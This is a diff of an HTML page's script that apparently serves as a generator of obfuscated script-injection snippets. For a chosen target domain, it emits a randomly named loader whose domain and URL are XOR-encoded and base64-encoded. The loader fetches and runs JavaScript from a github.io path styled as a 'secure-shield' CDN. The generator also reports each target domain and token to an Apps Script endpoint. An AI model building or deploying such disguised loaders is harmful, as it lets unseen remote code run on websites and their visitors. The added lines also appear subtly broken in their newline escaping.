@@ -83,154 +83,147 @@
     </div>
 
     <script>
-        const APPS_SCRIPT_URL = "__APPS_SCRIPT_URL__";
+    const APPS_SCRIPT_URL = "__APPS_SCRIPT_URL__";
 
-        function isValidHttpUrl(value) {
-            if (typeof value !== 'string') return false;
-            const trimmed = value.trim();
-            if (!trimmed) return false;
-            try {
-                const url = new URL(trimmed);
-                return url.protocol === 'http:' || url.protocol === 'https:';
-            } catch (error) {
-                return false;
-            }
+    function setStatus(message) {
+        const el = document.getElementById("statusBox");
+        if (el) el.textContent = "Status: " + message;
+    }
+
+    function isValidUrl(value) {
+        try {
+            const u = new URL(value);
+            return u.protocol === "http:" || u.protocol === "https:";
+        } catch (e) {
+            return false;
+        }
+    }
+
+    function _rndStr(len = 6) {
+        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        let res = "_0x";
+        for (let i = 0; i < len; i++) {
+            res += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return res;
+    }
+
+    function _obfuscate(text, key) {
+        let result = "";
+        const safeText = encodeURIComponent(text);
+        for (let i = 0; i < safeText.length; i++) {
+            result += String.fromCharCode(safeText.charCodeAt(i) ^ key);
+        }
+        return btoa(result);
+    }
+
+    function _sendTelemetry(domain, token) {
+        const url = (APPS_SCRIPT_URL || "").trim();
+
+        if (!isValidUrl(url) || url.includes("__APPS_SCRIPT_URL__")) {
+            console.warn("[TT] APPS_SCRIPT_URL no está configurada o es inválida.");
+            setStatus("telemetry disabled");
+            return;
         }
 
-        function setStatus(message) {
-            const el = document.getElementById('statusBox');
-            if (el) {
-                el.textContent = 'Status: ' + message;
-            }
-        }
+        try {
+            const callbackName = "_tt_cb_" + Math.random().toString(36).slice(2, 10);
+            const script = document.createElement("script");
+            script.async = true;
 
-        function _rndStr(len = 6) {
-            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-            let res = '_0x';
-            for (let i = 0; i < len; i++) {
-                res += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            return res;
-        }
+            const cleanup = function () {
+                try { delete window[callbackName]; } catch (e) {}
+                if (script && script.parentNode) script.parentNode.removeChild(script);
+            };
 
-        function _obfuscate(text, key) {
-            let result = '';
-            const safeText = encodeURIComponent(text);
-            for (let i = 0; i < safeText.length; i++) {
-                result += String.fromCharCode(safeText.charCodeAt(i) ^ key);
-            }
-            return btoa(result);
-        }
+            window[callbackName] = function (response) {
+                console.log("[TT] Respuesta JSONP recibida:", response);
+                if (response && response.ok) {
+                    setStatus("telemetry sent");
+                } else {
+                    setStatus("telemetry failed");
+                }
+                cleanup();
+            };
 
-        function _sendTelemetry(domain, token) {
-            const rawUrl = APPS_SCRIPT_URL && APPS_SCRIPT_URL.trim ? APPS_SCRIPT_URL.trim() : '';
-            if (!isValidHttpUrl(rawUrl) || rawUrl.includes('__APPS_SCRIPT_URL__')) {
-                console.warn('[TT] APPS_SCRIPT_URL no está configurada o no es válida. Telemetría desactivada.');
-                setStatus('telemetry disabled (missing secret)');
+            const endpoint = new URL(url);
+            endpoint.searchParams.set("callback", callbackName);
+            endpoint.searchParams.set("domain", domain);
+            endpoint.searchParams.set("token", token);
+            endpoint.searchParams.set("timestamp", new Date().toISOString());
+
+            script.src = endpoint.toString();
+            script.onerror = function () {
+                console.error("[TT] Falla al cargar el Web App de Apps Script.");
+                setStatus("telemetry error");
+                cleanup();
+            };
+
+            document.body.appendChild(script);
+            setTimeout(cleanup, 7000);
+
+        } catch (err) {
+            console.error("[TT] Error enviando telemetry:", err);
+            setStatus("telemetry error");
+        }
+    }
+
+    function _gn8x() {
+        try {
+            const _d = document.getElementById("targetDomain").value.trim();
+            const _box = document.getElementById("resultContainer");
+            const _txt = document.getElementById("resultText");
+
+            if (!_d) {
+                alert("Error: Please enter a target website domain.");
                 return;
             }
 
-            try {
-                const callbackName = '_tt_cb_' + Math.random().toString(36).slice(2, 10);
-                const script = document.createElement('script');
-                script.async = true;
+            const _vDomain = _rndStr(5);
+            const _vToken = _rndStr(6);
+            const _vFn = _rndStr(7);
+            const _vCdn = _rndStr(6);
+            const _vKey = Math.floor(Math.random() * 200) + 15;
 
-                const cleanup = function () {
-                    try {
-                        delete window[callbackName];
-                    } catch (e) {}
-                    if (script && script.parentNode) {
-                        script.parentNode.removeChild(script);
-                    }
-                };
+            const array = new Uint8Array(8);
+            crypto.getRandomValues(array);
+            const _tokenHex = Array.from(array, b => b.toString(16).padStart(2, "0")).join("");
 
-                window[callbackName] = function (response) {
-                    console.log('[TT] Respuesta JSONP recibida:', response);
-                    if (response && response.ok) {
-                        setStatus('telemetry sent successfully');
-                    } else {
-                        setStatus('telemetry failed');
-                    }
-                    cleanup();
-                };
+            const _u = "edthedog-debug";
+            const _r = "secure-shield-cdn";
+            const _rawCdnUrl = "https://" + _u + ".github.io/" + _r + "/shield.min.js";
 
-                const endpoint = new URL(rawUrl);
-                endpoint.searchParams.set('callback', callbackName);
-                endpoint.searchParams.set('domain', domain);
-                endpoint.searchParams.set('token', token);
-                endpoint.searchParams.set('timestamp', new Date().toISOString());
+            const _encDomain = _obfuscate(_d, _vKey);
+            const _encCdn = _obfuscate(_rawCdnUrl, _vKey);
 
-                script.src = endpoint.toString();
-                script.onerror = function () {
-                    console.error('[TT] JSONP falló. Verifica la URL del Apps Script y la CSP.');
-                    setStatus('telemetry error');
-                    cleanup();
-                };
+            const _closeTag = "</" + "script>";
 
-                document.body.appendChild(script);
-                setTimeout(cleanup, 7000);
-            } catch (error) {
-                console.error('[TT] Error enviando telemetry:', error);
-                setStatus('telemetry error');
-            }
+            const _scriptPayload =
+                "<script>\\n" +
+                "/* [TOXIC-TURF-SHIELD // TARGET: " + _d.toUpperCase() + " // SIG: " + _tokenHex + "] */\\n" +
+                "!(function(){\\n" +
+                "  const " + _vDomain + " = decodeURIComponent(atob('" + _encDomain + "').split('').map(function(c){return String.fromCharCode(c.charCodeAt(0)^" + _vKey + ");}).join(''));\\n" +
+                "  const " + _vCdn + " = decodeURIComponent(atob('" + _encCdn + "').split('').map(function(c){return String.fromCharCode(c.charCodeAt(0)^" + _vKey + ");}).join(''));\\n" +
+                "  const " + _vToken + " = '" + _tokenHex + "';\\n" +
+                "  window._TT_SIG = { domain: " + _vDomain + ", token: " + _vToken + " };\\n" +
+                "  const " + _vFn + " = document.createElement('script');\\n" +
+                "  " + _vFn + ".src = " + _vCdn + " + '?site=' + encodeURIComponent(" + _vDomain + ") + '&sig=' + " + _vToken + ";\\n" +
+                "  " + _vFn + ".async = true;\\n" +
+                "  document.head.appendChild(" + _vFn + ");\\n" +
+                "})();\\n" +
+                _closeTag;
+
+            _txt.innerText = _scriptPayload;
+            _box.style.display = "block";
+            setStatus("generated");
+
+            _sendTelemetry(_d, _tokenHex);
+
+        } catch (err) {
+            console.error("Generator Error:", err);
+            alert("Generation error: " + err.message);
         }
-
-        function _gn8x() {
-            try {
-                const _d = document.getElementById('targetDomain').value.trim();
-                const _box = document.getElementById('resultContainer');
-                const _txt = document.getElementById('resultText');
-
-                if (!_d) {
-                    alert('Error: Please enter a target website domain.');
-                    return;
-                }
-
-                const _vDomain = _rndStr(5);
-                const _vToken = _rndStr(6);
-                const _vFn = _rndStr(7);
-                const _vCdn = _rndStr(6);
-                const _vKey = Math.floor(Math.random() * 200) + 15;
-
-                const array = new Uint8Array(8);
-                crypto.getRandomValues(array);
-                const _tokenHex = Array.from(array, b => b.toString(16).padStart(2, '0')).join('');
-
-                const _u = "edthedog-debug";
-                const _r = "secure-shield-cdn";
-                const _rawCdnUrl = "https://" + _u + ".github.io/" + _r + "/shield.min.js";
-
-                const _encDomain = _obfuscate(_d, _vKey);
-                const _encCdn = _obfuscate(_rawCdnUrl, _vKey);
-
-                const _closeTag = '</' + 'script>';
-
-                const _scriptPayload =
-'<script>\n' +
-'/* [TOXIC-TURF-SHIELD // TARGET: ' + _d.toUpperCase() + ' // SIG: ' + _tokenHex + '] */\n' +
-'!(function(){\n' +
-'  const ' + _vDomain + ' = decodeURIComponent(atob(\'' + _encDomain + '\').split(\'\').map(function(c){return String.fromCharCode(c.charCodeAt(0)^' + _vKey + ');}).join(\'\'));\n' +
-'  const ' + _vCdn + ' = decodeURIComponent(atob(\'' + _encCdn + '\').split(\'\').map(function(c){return String.fromCharCode(c.charCodeAt(0)^' + _vKey + ');}).join(\'\'));\n' +
-'  const ' + _vToken + ' = "' + _tokenHex + '";\n' +
-'  window._TT_SIG = { domain: ' + _vDomain + ', token: ' + _vToken + ' };\n' +
-'  const ' + _vFn + ' = document.createElement(\'script\');\n' +
-'  ' + _vFn + '.src = ' + _vCdn + ' + "?site=" + encodeURIComponent(' + _vDomain + ') + "&sig=" + ' + _vToken + ';\n' +
-'  ' + _vFn + '.async = true;\n' +
-'  document.head.appendChild(' + _vFn + ');\n' +
-'})();\n' +
-_closeTag;
-
-                _txt.innerText = _scriptPayload;
-                _box.style.display = 'block';
-                setStatus('generated');
-
-                _sendTelemetry(_d, _tokenHex);
-
-            } catch (err) {
-                console.error('Generator Error:', err);
-                alert('Generation error: ' + err.message);
-            }
-        }
+    }
     </script>
 </body>
 </html>
